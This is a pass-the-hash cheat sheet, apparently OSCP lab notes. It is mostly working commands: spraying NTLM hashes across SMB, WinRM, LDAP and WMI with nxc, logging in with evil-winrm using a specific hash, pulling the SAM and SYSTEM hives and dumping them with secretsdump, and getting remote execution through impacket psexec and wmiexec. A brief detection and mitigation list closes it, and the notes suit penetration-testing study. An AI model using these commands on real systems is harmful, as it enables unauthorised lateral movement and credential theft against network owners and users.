# Pass-The-Hash (PtH)
**What:** Use an NTLM hash directly to authenticate against SMB/WMI/other services (no plaintext password).  
**Privileges needed:** Valid NTLM hash for an account with access to target.  
**Common tools:** Impacket (`psexec.py`, `wmiexec.py`, `smbexec.py`), nxc.

--- 
## Hash Spray!
```bash
# bruteforce all hashes against all users
nxc smb 192.168.1.1 -u users.txt -H unique_hashes.txt --continue-on-success
nxc winrm 192.168.1.1 -u users.txt -H unique_hashes.txt --continue-on-success
nxc ldap 192.168.1.1 -u users.txt -H unique_hashes.txt --continue-on-success
nxc wmi 192.168.1.1 -u users.txt -H unique_hashes.txt --continue-on-success
```
## WINRM
```bash 

# winrm TCP 5985 / 5986
evil-winrm -u celia.almeda  -H 'e728ecbadfb02f51ce8eed753f3ff3fd'  -i 10.10.158.142		
# evil-winrm has build in upload functionality, using that instead .. 
# Upload is from directory evil-winrm was luanched in
upload winPEASx64.exe .
*Evil-WinRM* PS C:\windows.old\windows\system32> download SAM
*Evil-WinRM* PS C:\windows.old\windows\system32> download SYSTESM

secretsdump.py -sam SAM -system SYSTEM LOCAL

```
---
## SMB
```bash
# Use only NTLM hash (no LM): -hashes LMHASH:NTLMHASH ; if no LM, use :NTLMHASH 
impacket-psexec CORP\\Administrator@10.0.0.5 -hashes :<NTLM_HASH>

# OSCP-A live example
impacket-psexec -hashes 00000000000000000000000000000000:e728ecbadfb02f51ce8eed753f3ff3fd celia.almeda@10.10.158.142 

# ?
impacket-psexec oscp.exam/administrator@192.168.1.1 -hashes :NTLM_HASH


nxc smb 10.0.0.0/24 -u Administrator -H <NTLM_HASH> -x "whoami /all"

smbclient \\\\10.10.158.142\\secrets -U celia.almeda --pw-nt-hash e728ecbadfb02f51ce8eed753f3ff3fd
```

---
## WMI
```bash
impacket-wmiexec CORP\\svcacct@10.0.0.8 -hashes :<NTLM_HASH>

impacket-wmiexec oscp.exam/administrator@192.168.1.1 -hashes :NTLM_HASH
impacket-wmiexec oscp.exam/administrator@192.168.1.1 -hashes LM_HASH:NTLM_HASH


```
---
## 
```bash

```
## **Detection / Mitigation**

- Detect lateral auth using NTLM hashes, anomalous SMB/WMI sessions, and use of NTLM across hosts.
    
- Mitigate by: prefer Kerberos, patching, local admin separation, LSA protection, enforce SMB signing, reduce exposed NTLM usage, and rotate/limit credential scope.
    

---
